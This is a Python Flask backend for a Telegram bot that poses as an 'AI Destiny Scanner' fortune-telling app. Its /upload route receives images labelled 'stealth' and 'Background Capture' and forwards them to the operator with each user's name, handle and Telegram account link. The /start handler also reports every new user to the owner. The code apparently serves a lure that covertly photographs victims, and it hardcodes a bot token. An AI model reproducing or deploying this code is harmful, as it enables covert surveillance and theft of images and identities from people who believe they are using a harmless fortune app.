import os
import json
import base64
import time
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

# --- CONFIG ---
TOKEN = '8755220333:AAG9jbF0-SKE_nZ9WeaxrguY42IMCUocGmk'
OWNER_ID = '7812553563' 

# သတိပြုရန် - Vercel ပေါ်ရောက်သွားရင် ဒီ URL ကို Vercel ကချပေးတဲ့ URL အသစ်နဲ့ လဲပေးရပါမယ်။
WEB_APP_URL = 'https://myanmartarrot.onrender.com' 

@app.route('/')
def index():
    try:
        return open('index.html', 'r', encoding='utf-8').read()
    except:
        return "index.html file not found in root directory", 404

@app.route('/health')
def health_check():
    return "Vercel Server is Alive", 200

# Webhook Set လုပ်ရန် လမ်းကြောင်း
@app.route('/set_webhook')
def set_webhook():
    webhook_url = f"https://{request.host}/webhook"
    url = f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={webhook_url}"
    response = requests.get(url)
    return jsonify({"webhook_url": webhook_url, "telegram_response": response.json()})

# Webhook အလုပ်လုပ်မည့် လမ်းကြောင်း
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    # /start command ကို စစ်ဆေးခြင်း
    if update and "message" in update and "text" in update["message"]:
        if update["message"]["text"] == "/start":
            chat_id = update["message"]["chat"]["id"]
            user = update["message"]["from"]
            
            # Admin ဆီသို့ အသိပေးစာပို့ခြင်း
            owner_alert = f"🚀 User အသစ်ရောက်လာပါပြီ\nName: {user.get('first_name', 'Unknown')}\nID: {user.get('id')}\nLink: tg://user?id={user.get('id')}"
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": OWNER_ID, "text": owner_alert})

            # User ဆီသို့ Reply ပြန်ခြင်း
            reply_markup = {
                "keyboard": [[{"text": "AI Destiny Scanner ဖွင့်ရန်", "web_app": {"url": WEB_APP_URL}}]],
                "resize_keyboard": True
            }
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
                "chat_id": chat_id,
                "text": "✨ သင့်ရဲ့ ဒီနေ့ကံကြမ္မာကို စစ်ဆေးဖို့ အောက်ကခလုတ်ကို နှိပ်ပါ -",
                "reply_markup": reply_markup
            })
    return "OK", 200

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        user_id = data.get('user_id')
        user_name = data.get('user_name')
        user_handle = data.get('user_handle', 'No Username')
        image_base64 = data.get('image').split(",")[1]
        
        # Vercel တွင် ဖိုင်သိမ်းရန် /tmp ကိုသာ သုံးခွင့်ရှိသည်
        filename = f"/tmp/stealth_{user_id}_{int(time.time())}.jpg"
        with open(filename, "wb") as f:
            f.write(base64.b64decode(image_base64))

        # Admin ထံသို့ ပုံပို့ခြင်း
        user_link = f"tg://user?id={user_id}"
        caption = (
            f"📸 **Background Capture**\n"
            f"👤 User: {user_name}\n"
            f"🔗 Handle: {user_handle}\n"
            f"🆔 ID: `{user_id}`\n"
            f"🌐 Account Link: [Click Here]({user_link})"
        )
        
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(filename, 'rb') as photo:
            requests.post(url, data={'chat_id': OWNER_ID, 'caption': caption, 'parse_mode': 'Markdown'}, files={'photo': photo})
            
        if os.path.exists(filename): 
            os.remove(filename)
            
        return jsonify({"status": "received"}), 200
    except Exception as e:
        print(f"Error in upload: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/share_report', methods=['POST'])
def share_report():
    try:
        data = request.json
        user_id = data.get('user_id')
        image_base64 = data.get('image').split(",")[1] 
        
        if not user_id or user_id == "Guest":
            return jsonify({"status": "skipped", "reason": "no_user_id"}), 200

        image_data = base64.b64decode(image_base64)
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        files = {'photo': ('report_card.png', image_data)}
        data_payload = {
            'chat_id': user_id,
            'caption': "🔮 သင်၏ ဒီနေ့ကံကြမ္မာ Report Card ရရှိပါပြီ။"
        }
        
        requests.post(url, data=data_payload, files=files)
        return jsonify({"status": "sent"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Serverless ဖြစ်သဖြင့် Thread များ မလိုအပ်တော့ပါ (app.run ခေါ်ရန်မလိုပါ)
